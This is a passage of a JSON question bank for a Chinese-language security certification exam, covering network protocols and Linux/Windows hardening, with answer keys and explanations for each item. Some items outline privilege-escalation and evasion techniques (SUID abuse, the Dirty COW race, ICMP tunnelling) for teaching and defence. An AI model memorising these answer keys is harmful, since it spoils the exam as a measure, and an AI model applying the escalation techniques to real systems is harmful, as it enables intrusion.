      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：HTTP/2 引入了二進位分幀層（Binary Framing Layer），將訊息分割為獨立的幀（Frames），並在單一 TCP 連線上交錯傳輸多個雙向請求與響應（多路復用）。這徹底解決了 HTTP/1.1 中因瀏覽器併發連線數限制（通常 6 個）及請求必須排隊等待的 HTTP 隊頭阻塞問題。\n\n- **干擾項辨析**：\n\n  - (A) HTTP/3（QUIC）才是基於 UDP，HTTP/2 底層依然是 TCP。\n\n  - (C) HTTP/2 依然支援 Cookie，並引入 HPACK 進行頭部壓縮。\n\n  - (D) HTTP/2 與承載的業務資料格式（JSON/HTML/XML）無關。"
    },
    {
      "id": 48,
      "exam": "exam_a",
      "domain": "領域三：網路協議分析與封包取證",
      "category": "網路協議 / HTTP 狀態碼意涵",
      "type": "single_choice",
      "question": "在 Web 應用安全測試中，當客戶端向伺服器發出請求時，伺服器回應狀態碼 `403 Forbidden` 與 `401 Unauthorized`，兩者的核心差異為何？",
      "options": {
        "A": "401 表示身分未經認證（未登入或憑證無效），403 表示伺服器已識別身分但該身分無權存取該資源",
        "B": "401 是伺服器端代碼崩潰，403 是客戶端網路中斷",
        "C": "401 專指 API 逾時，403 專指密碼輸入錯誤過多次",
        "D": "兩者意義完全相同，純粹由不同 Web 伺服器隨機挑選"
      },
      "answer": "A",
      "basis": "RFC 7235 明確定義：\n\n  - `401 Unauthorized`（身分未認證）：表示請求缺少有效的身分憑證（Authentication Credentials），客戶端需要登入或提供合法 Token。\n\n  - `403 Forbidden`（存取被禁止）：表示伺服器已理解請求者的身分（已認證），但該身分無權存取（Authorization Failure）該特定資源，即使重新登入也無法存取。",
      "distractor": "- (B)、(C)、(D) 均為對 HTTP 語意規範的錯誤理解。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：RFC 7235 明確定義：\n\n  - `401 Unauthorized`（身分未認證）：表示請求缺少有效的身分憑證（Authentication Credentials），客戶端需要登入或提供合法 Token。\n\n  - `403 Forbidden`（存取被禁止）：表示伺服器已理解請求者的身分（已認證），但該身分無權存取（Authorization Failure）該特定資源，即使重新登入也無法存取。\n\n- **干擾項辨析**：\n\n  - (B)、(C)、(D) 均為對 HTTP 語意規範的錯誤理解。"
    },
    {
      "id": 49,
      "exam": "exam_a",
      "domain": "領域三：網路協議分析與封包取證",
      "category": "網路取證 / 封包切割與重組",
      "type": "single_choice",
      "question": "在乙太網路中，標準的最大傳輸單元（MTU）為 1500 位元組。當 IP 封包大小超過 MTU 且 DF (Don't Fragment) 標誌為 0 時，IP 標頭會進行分片處理。鑑識人員在拼裝分片封包時，主要依賴 IP 標頭中的哪三個欄位？",
      "options": {
        "A": "Identification（標識符）、Flags（標誌位）、Fragment Offset（分片偏移）",
        "B": "TTL、Protocol、Checksum",
        "C": "Source IP、Destination IP、Window Size",
        "D": "Version、IHL、Type of Service"
      },
      "answer": "A",
      "basis": "IPv4 分片重組機制依賴 IP 標頭的第二個 32 位元字組：\n\n  1. Identification（16 位元）：標識屬於同一個原始 IP 數據報。\n\n  2. Flags（3 位元）：包含 DF（禁止分片）與 MF（More Fragments，後續還有分片）。\n\n  3. Fragment Offset（13 位元）：標明該分片在原始數據報中的相對位置（以 8 位元組為單位）。",
      "distractor": "- (B) TTL、Protocol 用於跳數與上層協定標識。\n\n  - (C) Window Size 是 TCP 標頭欄位，非 IP 標頭。\n\n  - (D) IHL 是標頭長度，ToS 是服務類型。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：IPv4 分片重組機制依賴 IP 標頭的第二個 32 位元字組：\n\n  1. Identification（16 位元）：標識屬於同一個原始 IP 數據報。\n\n  2. Flags（3 位元）：包含 DF（禁止分片）與 MF（More Fragments，後續還有分片）。\n\n  3. Fragment Offset（13 位元）：標明該分片在原始數據報中的相對位置（以 8 位元組為單位）。\n\n- **干擾項辨析**：\n\n  - (B) TTL、Protocol 用於跳數與上層協定標識。\n\n  - (C) Window Size 是 TCP 標頭欄位，非 IP 標頭。\n\n  - (D) IHL 是標頭長度，ToS 是服務類型。"
    },
    {
      "id": 50,
      "exam": "exam_a",
      "domain": "領域三：網路協議分析與封包取證",
      "category": "網路協議 / ICMP 隱蔽通道",
      "type": "single_choice",
      "question": "攻擊者常使用 `ptunnel` 或自編腳本將木馬連線數據封裝於 ICMP 協議中以繞過防火牆。此技術主要將有效載荷隱匿於 ICMP 報文的哪一個部分？",
      "options": {
        "A": "ICMP Type 欄位",
        "B": "ICMP Code 欄位",
        "C": "ICMP Data（負載資料區）",
        "D": "IP Checksum 欄位  \n\n\n\n---\n\n\n\n## 領域四：系統安全加固、Linux/Windows 權限與配置 (第 51 ~ 65 題)"
      },
      "answer": "C",
      "basis": "標準的 ICMP Echo Request / Echo Reply（Ping 封包）允許攜帶可變長度的可選負載資料（Data 欄位，例如 Windows ping 預設填充 32 bytes 的 `abcdefghi...`）。ICMP 隧道工具正是將被封裝的 TCP/SSH/Shell 數據編碼後替換原有的 Echo Data 區塊，從而在看似合法的 Ping 請求中夾帶惡意通訊。",
      "distractor": "- (A) Type 欄位僅 1 byte（如 Type 8 代表 Request，Type 0 代表 Reply），無法存放大量數據。\n\n  - (B) Code 欄位僅 1 byte，用於子類型標識。\n\n  - (D) Checksum 是動態校驗碼，竄改會導致封包被協議棧丟棄。",
      "full_solution": "- **正確答案**：**(C)**\n\n- **正解依據**：標準的 ICMP Echo Request / Echo Reply（Ping 封包）允許攜帶可變長度的可選負載資料（Data 欄位，例如 Windows ping 預設填充 32 bytes 的 `abcdefghi...`）。ICMP 隧道工具正是將被封裝的 TCP/SSH/Shell 數據編碼後替換原有的 Echo Data 區塊，從而在看似合法的 Ping 請求中夾帶惡意通訊。\n\n- **干擾項辨析**：\n\n  - (A) Type 欄位僅 1 byte（如 Type 8 代表 Request，Type 0 代表 Reply），無法存放大量數據。\n\n  - (B) Code 欄位僅 1 byte，用於子類型標識。\n\n  - (D) Checksum 是動態校驗碼，竄改會導致封包被協議棧丟棄。"
    },
    {
      "id": 51,
      "exam": "exam_a",
      "domain": "領域四：系統安全加固、Linux/Windows 權限與配置",
      "category": "Linux安全 / 特殊權限 SUID",
      "type": "single_choice",
      "question": "在 Linux 檔案系統中，當一個執行檔被賦予 SUID（Set UID）權限（如 `chmod u+s /usr/bin/find`）時，這代表何種執行行為？",
      "options": {
        "A": "任何使用者執行該程式時，該行程將暫時獲得該檔案擁有者（Owner）的權限",
        "B": "該程式只能由 root 使用者執行",
        "C": "該程式在執行時會被防毒軟體即時沙箱隔離",
        "D": "只有屬於該檔案群組的成員才能執行"
      },
      "answer": "A",
      "basis": "SUID（Set User ID）是 Unix-like 系統中的特殊權限標誌（八進位 4000）。當一個可執行檔具備 SUID 時，任何普通使用者執行該檔案所產生的行程，其有效使用者 ID（EUID）會暫時提升為該檔案擁有者（Owner，通常為 root）。若該檔案存在命令執行或未做限制的提權路徑（如 GTFOBins 列出的 `find`、`vim`、`bash` 等），一般使用者即可藉此獲取 root shell。",
      "distractor": "- (B) SUID 程式通常就是設計給普通使用者執行的（如 `/usr/bin/passwd` 允許普通使用者修改自己密碼）。\n\n  - (C)、(D) 均為錯誤概念。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：SUID（Set User ID）是 Unix-like 系統中的特殊權限標誌（八進位 4000）。當一個可執行檔具備 SUID 時，任何普通使用者執行該檔案所產生的行程，其有效使用者 ID（EUID）會暫時提升為該檔案擁有者（Owner，通常為 root）。若該檔案存在命令執行或未做限制的提權路徑（如 GTFOBins 列出的 `find`、`vim`、`bash` 等），一般使用者即可藉此獲取 root shell。\n\n- **干擾項辨析**：\n\n  - (B) SUID 程式通常就是設計給普通使用者執行的（如 `/usr/bin/passwd` 允許普通使用者修改自己密碼）。\n\n  - (C)、(D) 均為錯誤概念。"
    },
    {
      "id": 52,
      "exam": "exam_a",
      "domain": "領域四：系統安全加固、Linux/Windows 權限與配置",
      "category": "Linux安全 / Linux Capabilities",
      "type": "single_choice",
      "question": "傳統 Linux 只有 root (UID 0) 與一般使用者兩分法，為實踐最小權限原則，現代 Linux 核心引入了 Capabilities。若希望某自訂網路程式無需 root 即可監聽 80 端口，應賦予其哪一項 capability？",
      "options": {
        "A": "`CAP_NET_BIND_SERVICE`",
        "B": "`CAP_SYS_ADMIN`",
        "C": "`CAP_DAC_OVERRIDE`",
        "D": "`CAP_SETUID`"
      },
      "answer": "A",
      "basis": "在 Linux 中，低於 1024 的特權網路端口（Privileged Ports，如 80、443、53）預設只有 root 可以綁定。透過 Linux Capabilities 機制，管理員可使用 `setcap 'cap_net_bind_service=+ep' /path/to/binary` 指令，將「綁定小於 1024 端口」的單項權限單獨賦予該執行檔，避免賦予完整 root 權限，符合最小權限原則。",
      "distractor": "- (B) `CAP_SYS_ADMIN` 是幾乎等同於 root 的超級權限，違背最小權限原則。\n\n  - (C) `CAP_DAC_OVERRIDE` 用於忽略檔案讀寫執行權限檢查。\n\n  - (D) `CAP_SETUID` 用於任意更改 UID。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：在 Linux 中，低於 1024 的特權網路端口（Privileged Ports，如 80、443、53）預設只有 root 可以綁定。透過 Linux Capabilities 機制，管理員可使用 `setcap 'cap_net_bind_service=+ep' /path/to/binary` 指令，將「綁定小於 1024 端口」的單項權限單獨賦予該執行檔，避免賦予完整 root 權限，符合最小權限原則。\n\n- **干擾項辨析**：\n\n  - (B) `CAP_SYS_ADMIN` 是幾乎等同於 root 的超級權限，違背最小權限原則。\n\n  - (C) `CAP_DAC_OVERRIDE` 用於忽略檔案讀寫執行權限檢查。\n\n  - (D) `CAP_SETUID` 用於任意更改 UID。"
    },
    {
      "id": 53,
      "exam": "exam_a",
      "domain": "領域四：系統安全加固、Linux/Windows 權限與配置",
      "category": "Linux加固 / 密碼雜湊欄位",
      "type": "single_choice",
      "question": "在 Linux 系統的 `/etc/shadow` 檔案中，密碼欄位以 `$` 符號分隔。若某一行的密碼字串為 `$6$r9Jk3L...$...`，其中的 `$6$` 代表該密碼雜湊採用了哪一種演算法？",
      "options": {
        "A": "MD5",
        "B": "Blowfish",
        "C": "SHA-256",
        "D": "SHA-512"
      },
      "answer": "D",
      "basis": "Linux `/etc/shadow` 中密碼欄位以 `$` 分隔為多個區段：`$id$salt$hash`。其中演算法 ID 規範如下：\n\n  - `$1$`：MD5\n\n  - `$2a$` 或 `$2y$`：Blowfish\n\n  - `$5$`：SHA-256\n\n  - `$6$`：SHA-512（目前主流 Linux 發行版預設）\n\n  - `$y$`：Yescrypt（部分最新發行版採用）",
      "distractor": "- (A) MD5 是 `$1$`。\n\n  - (B) Blowfish 是 `$2a$`。\n\n  - (C) SHA-256 是 `$5$`。",
      "full_solution": "- **正確答案**：**(D)**\n\n- **正解依據**：Linux `/etc/shadow` 中密碼欄位以 `$` 分隔為多個區段：`$id$salt$hash`。其中演算法 ID 規範如下：\n\n  - `$1$`：MD5\n\n  - `$2a$` 或 `$2y$`：Blowfish\n\n  - `$5$`：SHA-256\n\n  - `$6$`：SHA-512（目前主流 Linux 發行版預設）\n\n  - `$y$`：Yescrypt（部分最新發行版採用）\n\n- **干擾項辨析**：\n\n  - (A) MD5 是 `$1$`。\n\n  - (B) Blowfish 是 `$2a$`。\n\n  - (C) SHA-256 是 `$5$`。"
    },
    {
      "id": 54,
      "exam": "exam_a",
      "domain": "領域四：系統安全加固、Linux/Windows 權限與配置",
      "category": "Linux加固 / SSH 服務安全",
      "type": "single_choice",
      "question": "為加固 Linux 伺服器的 OpenSSH 服務，防止未授權密碼暴力破解與管理者帳號直登，管理員在 `/etc/ssh/sshd_config` 中最應配置的兩項安全指令為何？",
      "options": {
        "A": "`PermitRootLogin no` 與 `PasswordAuthentication no`（改用公鑰認證）",
        "B": "`Port 22` 與 `X11Forwarding yes`",
        "C": "`PermitEmptyPasswords yes` 與 `IgnoreRhosts no`",
        "D": "`UsePAM no` 與 `MaxAuthTries 100`"
      },
      "answer": "A",
      "basis": "在 CIS Benchmark 與資安標準中，加固 SSH 的兩大首要防線是：\n\n  1. `PermitRootLogin no`：禁止 root 使用者透過 SSH 直接遠端登入，迫使攻擊者必須先猜中一般帳號，再透過 sudo 提權，增加審計軌跡；\n\n  2. `PasswordAuthentication no`：徹底停用密碼驗證，改用 SSH Key（公私鑰對）認證，從根源杜絕密碼字典暴力破解。",
      "distractor": "- (B)、(C)、(D) 均包含高風險或弱化安全之配置。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：在 CIS Benchmark 與資安標準中，加固 SSH 的兩大首要防線是：\n\n  1. `PermitRootLogin no`：禁止 root 使用者透過 SSH 直接遠端登入，迫使攻擊者必須先猜中一般帳號，再透過 sudo 提權，增加審計軌跡；\n\n  2. `PasswordAuthentication no`：徹底停用密碼驗證，改用 SSH Key（公私鑰對）認證，從根源杜絕密碼字典暴力破解。\n\n- **干擾項辨析**：\n\n  - (B)、(C)、(D) 均包含高風險或弱化安全之配置。"
    },
    {
      "id": 55,
      "exam": "exam_a",
      "domain": "領域四：系統安全加固、Linux/Windows 權限與配置",
      "category": "Linux加固 / 防火牆 iptables",
      "type": "single_choice",
      "question": "在 Linux `iptables` 防火牆中，若要新增一條規則丟棄所有來自 IP `203.0.113.50` 對伺服器 22 端口（SSH）的 TCP 連線，應使用下列哪一條指令？",
      "options": {
        "A": "`iptables -A INPUT -p tcp -s 203.0.113.50 --dport 22 -j DROP`",
        "B": "`iptables -I OUTPUT -p tcp -d 203.0.113.50 --sport 22 -j REJECT`",
        "C": "`iptables -D FORWARD -s 203.0.113.50 -j ACCEPT`",
        "D": "`iptables -A PREROUTING -p udp -s 203.0.113.50 -j DROP`"
      },
      "answer": "A",
      "basis": "`iptables -A INPUT` 表示在入站鏈追加規則；`-p tcp` 指定 TCP 協定；`-s 203.0.113.50` 指定來源 IP；`--dport 22` 指定目的端口 22；`-j DROP` 表示靜默丟棄封包，完全符合題意。",
      "distractor": "- (B) `OUTPUT` 鏈控制本機對外發出的流量，`--sport` 是來源端口。\n\n  - (C) `-D` 是刪除規則，`ACCEPT` 是放行。\n\n  - (D) SSH 是 TCP 協定，非 UDP。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：`iptables -A INPUT` 表示在入站鏈追加規則；`-p tcp` 指定 TCP 協定；`-s 203.0.113.50` 指定來源 IP；`--dport 22` 指定目的端口 22；`-j DROP` 表示靜默丟棄封包，完全符合題意。\n\n- **干擾項辨析**：\n\n  - (B) `OUTPUT` 鏈控制本機對外發出的流量，`--sport` 是來源端口。\n\n  - (C) `-D` 是刪除規則，`ACCEPT` 是放行。\n\n  - (D) SSH 是 TCP 協定，非 UDP。"
    },
    {
      "id": 56,
      "exam": "exam_a",
      "domain": "領域四：系統安全加固、Linux/Windows 權限與配置",
      "category": "Linux安全 / 存取控制 SELinux",
      "type": "single_choice",
      "question": "在啟用 SELinux 的 Linux 系統中，若想暫時將 SELinux 切換為「僅記錄警告日誌但不實際阻擋違規操作」的寬容模式，管理員應執行哪一個指令？",
      "options": {
        "A": "`setenforce 0`",
        "B": "`setenforce 1`",
        "C": "`systemctl stop selinux`",
        "D": "`getenforce strict`"
      },
      "answer": "A",
      "basis": "SELinux 運作模式控制指令：\n\n  - `setenforce 0`：將目前模式動態切換為 Permissive（寬容模式，不阻擋任何操作，僅記錄 audit 違規告警）。\n\n  - `setenforce 1`：將目前模式切換為 Enforcing（強制模式，嚴格阻擋並記錄）。",
      "distractor": "- (B) `1` 是切換為 Enforcing。\n\n  - (C) SELinux 是核心子系統，無法直接透過 systemctl 停止服務。\n\n  - (D) `getenforce` 僅用於查看目前狀態。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：SELinux 運作模式控制指令：\n\n  - `setenforce 0`：將目前模式動態切換為 Permissive（寬容模式，不阻擋任何操作，僅記錄 audit 違規告警）。\n\n  - `setenforce 1`：將目前模式切換為 Enforcing（強制模式，嚴格阻擋並記錄）。\n\n- **干擾項辨析**：\n\n  - (B) `1` 是切換為 Enforcing。\n\n  - (C) SELinux 是核心子系統，無法直接透過 systemctl 停止服務。\n\n  - (D) `getenforce` 僅用於查看目前狀態。"
    },
    {
      "id": 57,
      "exam": "exam_a",
      "domain": "領域四：系統安全加固、Linux/Windows 權限與配置",
      "category": "Linux加固 / PAM 帳號防護",
      "type": "single_choice",
      "question": "為防禦 SSH 密碼字典暴力破解，Linux 可透過 PAM 模組設定「密碼連續錯誤 5 次則鎖定帳號 15 分鐘」。現代 Linux 系統（如 RHEL 8/9、Ubuntu 20.04+）普遍推薦配置哪一個 PAM 模組？",
      "options": {
        "A": "`pam_faillock.so` (或 `pam_tally2.so`)",
        "B": "`pam_rootok.so`",
        "C": "`pam_shells.so`",
        "D": "`pam_env.so`"
      },
      "answer": "A",
      "basis": "在 Linux PAM（可插入式認證模組）中，`pam_faillock.so`（在較早版本中為 `pam_tally2.so`）專門用於記錄使用者登入失敗次數，並在達到閥值（如 `deny=5 unlock_time=900`）時自動鎖定該帳號，防止攻擊者持續進行密碼爆破。",
      "distractor": "- (B) `pam_rootok.so` 用於免密碼放行 root。\n\n  - (C) `pam_shells.so` 用於檢查登入 shell 是否在 `/etc/shells` 中。\n\n  - (D) `pam_env.so` 用於設定環境變數。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：在 Linux PAM（可插入式認證模組）中，`pam_faillock.so`（在較早版本中為 `pam_tally2.so`）專門用於記錄使用者登入失敗次數，並在達到閥值（如 `deny=5 unlock_time=900`）時自動鎖定該帳號，防止攻擊者持續進行密碼爆破。\n\n- **干擾項辨析**：\n\n  - (B) `pam_rootok.so` 用於免密碼放行 root。\n\n  - (C) `pam_shells.so` 用於檢查登入 shell 是否在 `/etc/shells` 中。\n\n  - (D) `pam_env.so` 用於設定環境變數。"
    },
    {
      "id": 58,
      "exam": "exam_a",
      "domain": "領域四：系統安全加固、Linux/Windows 權限與配置",
      "category": "Windows安全 / UAC 使用者帳戶控制",
      "type": "single_choice",
      "question": "Windows 引入的 UAC（User Account Control）技術其核心設計目標為何？",
      "options": {
        "A": "取代防毒軟體即時查殺惡意病毒",
        "B": "讓即便是具有管理員身分的使用者，預設也僅以標準受限權限權杖（Standard Token）運行日常應用程式，唯有在需要高權限時才透過提示框請求提升（Elevation）",
        "C": "自動將所有檔案使用 BitLocker 進行加密",
        "D": "防止未經許可的遠端桌面 RDP 連線"
      },
      "answer": "B",
      "basis": "Windows UAC 的核心價值在於消除「隨時以全權限管理員身分運行應用程式」的陋習。當管理員使用者登入時，系統會為其建立兩個權杖：受限制的標準權杖（Standard Token）與完整管理權杖（Administrator Token）。所有日常程式（瀏覽器、Office 等）預設僅以標準權杖執行；唯有當程式嘗試修改系統目錄、登錄檔機碼等特權操作時，UAC 才會彈出同意提示（Consent Prompt）詢問是否切換為高權限權杖。",
      "distractor": "- (A) UAC 不是防毒軟體，無法替代防毒軟體的惡意代碼特徵偵測。\n\n  - (C) BitLocker 是全盤加密工具，與 UAC 無關。\n\n  - (D) RDP 存取由防火牆與遠端桌面服務控制。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：Windows UAC 的核心價值在於消除「隨時以全權限管理員身分運行應用程式」的陋習。當管理員使用者登入時，系統會為其建立兩個權杖：受限制的標準權杖（Standard Token）與完整管理權杖（Administrator Token）。所有日常程式（瀏覽器、Office 等）預設僅以標準權杖執行；唯有當程式嘗試修改系統目錄、登錄檔機碼等特權操作時，UAC 才會彈出同意提示（Consent Prompt）詢問是否切換為高權限權杖。\n\n- **干擾項辨析**：\n\n  - (A) UAC 不是防毒軟體，無法替代防毒軟體的惡意代碼特徵偵測。\n\n  - (C) BitLocker 是全盤加密工具，與 UAC 無關。\n\n  - (D) RDP 存取由防火牆與遠端桌面服務控制。"
    },
    {
      "id": 59,
      "exam": "exam_a",
      "domain": "領域四：系統安全加固、Linux/Windows 權限與配置",
      "category": "Windows加固 / 憑證保護 Credential Guard",
      "type": "single_choice",
      "question": "在 Windows 10/11 企業版與 Windows Server 2016+ 中，微軟引入了 Windows Defender Credential Guard。該技術主要利用何種底層機制將 LSASS 記憶體中的 NTLM Hash 與 Kerberos 票據隔離，防止 Mimikatz 進行提取？",
      "options": {
        "A": "虛擬化型安全性（Virtualization-based Security, VBS）將認證資料存放在隔離的虛擬安全模式（VSM）中",
        "B": "在硬碟上建立壓縮的加密備份",
        "C": "停用 Windows 內建的所有密碼驗證功能",
        "D": "透過防火牆全面封鎖 TCP 445 端口"
      },
      "answer": "A",
      "basis": "Credential Guard 是微軟對抗 Mimikatz 提取記憶體憑證的殺手級防護。它利用 Hyper-V 的虛擬化型安全性（VBS），在硬體層面劃分出一個獨立的虛擬安全模式（VSM）。LSASS 的身分驗證秘密（如 NTLM Hash、Kerberos TGT/金鑰）被存放在一個名為 `LsaIso.exe`（隔離的 LSA）的安全進程中。即使攻擊者在普通作業系統中獲取了 `SYSTEM` 最高權限，也無法讀取 VSM 虛擬機內部的記憶體空間。",
      "distractor": "- (B)、(C)、(D) 均非 Credential Guard 的防護機制。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：Credential Guard 是微軟對抗 Mimikatz 提取記憶體憑證的殺手級防護。它利用 Hyper-V 的虛擬化型安全性（VBS），在硬體層面劃分出一個獨立的虛擬安全模式（VSM）。LSASS 的身分驗證秘密（如 NTLM Hash、Kerberos TGT/金鑰）被存放在一個名為 `LsaIso.exe`（隔離的 LSA）的安全進程中。即使攻擊者在普通作業系統中獲取了 `SYSTEM` 最高權限，也無法讀取 VSM 虛擬機內部的記憶體空間。\n\n- **干擾項辨析**：\n\n  - (B)、(C)、(D) 均非 Credential Guard 的防護機制。"
    },
    {
      "id": 60,
      "exam": "exam_a",
      "domain": "領域四：系統安全加固、Linux/Windows 權限與配置",
      "category": "Windows加固 / SMB 安全與歷史漏洞",
      "type": "single_choice",
      "question": "2017 年席捲全球的 WannaCry 勒索軟體利用了「永恆之藍」（EternalBlue, MS17-010）漏洞進行蠕蟲式橫向傳播。該漏洞所影響的網路協定與加固阻斷措施為何？",
      "options": {
        "A": "影響 RDP 協定，加固措施為停用 3389 端口",
        "B": "影響 SMBv1 協定，加固措施為在 Windows 功能中徹底停用 SMBv1 並封鎖 TCP 445 端口",
        "C": "影響 NetBIOS 協定，加固措施為停用 UDP 137",
        "D": "影響 Kerberos 協定，加固措施為重置 krbtgt 密碼"
      },
      "answer": "B",
      "basis": "WannaCry 勒索病毒利用的是 NSA 外洩的方程式組織（Equation Group）軍火庫工具「永恆之藍」（EternalBlue），其針對的是 Windows 舊版 SMBv1 伺服器訊息區塊協定在解析 SrvOs2FeaList 結構時的緩衝區溢位漏洞（MS17-010）。緊急加固處置措施包括：在系統元件中徹底停用 SMB 1.0/CIFS 檔案共享支援，並在邊界防火牆全面封鎖 TCP 445 端口。",
      "distractor": "- (A) 永恆之藍不是針對 RDP（BlueKeep CVE-2019-0708 才是 RDP 漏洞）。\n\n  - (C)、(D) 與永恆之藍漏洞無關。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：WannaCry 勒索病毒利用的是 NSA 外洩的方程式組織（Equation Group）軍火庫工具「永恆之藍」（EternalBlue），其針對的是 Windows 舊版 SMBv1 伺服器訊息區塊協定在解析 SrvOs2FeaList 結構時的緩衝區溢位漏洞（MS17-010）。緊急加固處置措施包括：在系統元件中徹底停用 SMB 1.0/CIFS 檔案共享支援，並在邊界防火牆全面封鎖 TCP 445 端口。\n\n- **干擾項辨析**：\n\n  - (A) 永恆之藍不是針對 RDP（BlueKeep CVE-2019-0708 才是 RDP 漏洞）。\n\n  - (C)、(D) 與永恆之藍漏洞無關。"
    },
    {
      "id": 61,
      "exam": "exam_a",
      "domain": "領域四：系統安全加固、Linux/Windows 權限與配置",
      "category": "Windows安全 / Active Directory 群組原則",
      "type": "single_choice",
      "question": "在 Windows 網域管理中，群組原則物件（Group Policy Object, GPO）具有層級套用關係。當多個 GPO 之間產生設定衝突時，若無額外設定 Enforced，預設的覆蓋套用順序為何（後者覆蓋前者）？",
      "options": {
        "A": "本機 (Local) -> 站台 (Site) -> 網域 (Domain) -> 組織單位 (OU)",
        "B": "組織單位 (OU) -> 網域 (Domain) -> 站台 (Site) -> 本機 (Local)",
        "C": "站台 (Site) -> 本機 (Local) -> 組織單位 (OU) -> 網域 (Domain)",
        "D": "網域 (Domain) -> 組織單位 (OU) -> 本機 (Local) -> 站台 (Site)"
      },
      "answer": "A",
      "basis": "Active Directory 群組原則（GPO）的預設套用順序遵循 **LSDOU** 原則：\n\n  1. **L**ocal（本機原則）\n\n  2. **S**ite（站台原則）\n\n  3. **D**omain（網域原則）\n\n  4. **OU**（組織單位原則）  \n\n  後套用的原則會覆蓋先套用的衝突設定，因此 OU 的優先權最高，覆蓋順序為 Local -> Site -> Domain -> OU。",
      "distractor": "- (B)、(C)、(D) 順序均顛倒或錯亂。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：Active Directory 群組原則（GPO）的預設套用順序遵循 **LSDOU** 原則：\n\n  1. **L**ocal（本機原則）\n\n  2. **S**ite（站台原則）\n\n  3. **D**omain（網域原則）\n\n  4. **OU**（組織單位原則）  \n\n  後套用的原則會覆蓋先套用的衝突設定，因此 OU 的優先權最高，覆蓋順序為 Local -> Site -> Domain -> OU。\n\n- **干擾項辨析**：\n\n  - (B)、(C)、(D) 順序均顛倒或錯亂。"
    },
    {
      "id": 62,
      "exam": "exam_a",
      "domain": "領域四：系統安全加固、Linux/Windows 權限與配置",
      "category": "Windows加固 / 存取控制清單 ACL",
      "type": "single_choice",
      "question": "在 Windows NTFS 檔案系統安全架構中，用於定義「哪些使用者或群組擁有讀取、寫入、修改權限」的清單結構稱之為何？",
      "options": {
        "A": "SACL (System Access Control List，系統稽核存取控制清單)",
        "B": "DACL (Discretionary Access Control List，判別存取控制清單)",
        "C": "GDT (Global Descriptor Table)",
        "D": "SID (Security Identifier)"
      },
      "answer": "B",
      "basis": "在 Windows 安全描述元（Security Descriptor）中：\n\n  - **DACL**（Discretionary Access Control List）：由物件擁有者控制，存放具體的 ACE 項目，定義特定使用者或群組是否具備「允許」或「拒絕」的讀、寫、執行存取權限。\n\n  - **SACL**（System Access Control List）：用於配置系統稽核記錄，定義存取該檔案時何時觸發安全日誌記錄。",
      "distractor": "- (A) SACL 用於稽核紀錄，不決定存取放行與否。\n\n  - (C) GDT 是 x86 記憶體分段全域描述元表。\n\n  - (D) SID 是安全識別碼，用來唯一標識使用者或群組。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：在 Windows 安全描述元（Security Descriptor）中：\n\n  - **DACL**（Discretionary Access Control List）：由物件擁有者控制，存放具體的 ACE 項目，定義特定使用者或群組是否具備「允許」或「拒絕」的讀、寫、執行存取權限。\n\n  - **SACL**（System Access Control List）：用於配置系統稽核記錄，定義存取該檔案時何時觸發安全日誌記錄。\n\n- **干擾項辨析**：\n\n  - (A) SACL 用於稽核紀錄，不決定存取放行與否。\n\n  - (C) GDT 是 x86 記憶體分段全域描述元表。\n\n  - (D) SID 是安全識別碼，用來唯一標識使用者或群組。"
    },
    {
      "id": 63,
      "exam": "exam_a",
      "domain": "領域四：系統安全加固、Linux/Windows 權限與配置",
      "category": "Linux漏洞 / 核心競爭條件提權",
      "type": "single_choice",
      "question": "著名的「髒牛漏洞」（Dirty COW, CVE-2016-5195）是 Linux 核心中的一個嚴重本機提權漏洞。其漏洞根源為何？",
      "options": {
        "A": "核心在處理記憶體寫入時複製（Copy-on-Write, COW）機制時存在競爭條件（Race Condition），允許一般使用者覆寫唯讀記憶體映射檔案（如 `/etc/passwd`）",
        "B": "SSH 服務的緩衝區溢位",
        "C": "Sudo 工具中未正確處理斜線路徑",
        "D": "Bash Shell 的環境變數解析錯誤"
      },
      "answer": "A",
      "basis": "Dirty COW（髒牛，CVE-2016-5195）是 Linux 核心記憶體子系統的經典漏洞。在處理私有唯讀記憶體映射時，核心的 `get_user_pages` 存在寫入時複製（Copy-on-Write）與釋放分頁的競爭條件。攻擊者透過兩個執行緒相互競爭（一個 `madvise(MADV_DONTNEED)` 釋放快取分頁，另一個 `write(/proc/self/mem)` 寫入記憶體），可成功覆寫原本只有 root 才有寫入權限的磁碟檔案（如向 `/etc/passwd` 寫入一個 UID 0 的新帳號）。",
      "distractor": "- (B)、(C)、(D) 分別描述的是其他歷史漏洞，非 Dirty COW。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：Dirty COW（髒牛，CVE-2016-5195）是 Linux 核心記憶體子系統的經典漏洞。在處理私有唯讀記憶體映射時，核心的 `get_user_pages` 存在寫入時複製（Copy-on-Write）與釋放分頁的競爭條件。攻擊者透過兩個執行緒相互競爭（一個 `madvise(MADV_DONTNEED)` 釋放快取分頁，另一個 `write(/proc/self/mem)` 寫入記憶體），可成功覆寫原本只有 root 才有寫入權限的磁碟檔案（如向 `/etc/passwd` 寫入一個 UID 0 的新帳號）。\n\n- **干擾項辨析**：\n\n  - (B)、(C)、(D) 分別描述的是其他歷史漏洞，非 Dirty COW。"
    },
    {
      "id": 64,
      "exam": "exam_a",
      "domain": "領域四：系統安全加固、Linux/Windows 權限與配置",
      "category": "系統加固 / 最小化攻擊面",
      "type": "single_choice",
      "question": "在伺服器安全基準（CIS Benchmark）規範中，對於剛安裝完成的作業系統，下列哪一項**不符合**安全加固最佳實踐？",
      "options": {
        "A": "關閉並停用非必要的系統服務（如 Telnet, FTP, rsh）",
        "B": "啟用並配置全盤加密（如 Linux LUKS / Windows BitLocker）",
        "C": "為方便日常維護與跨團隊除錯，將常用管理員帳號設定為共用且取消密碼過期機制",
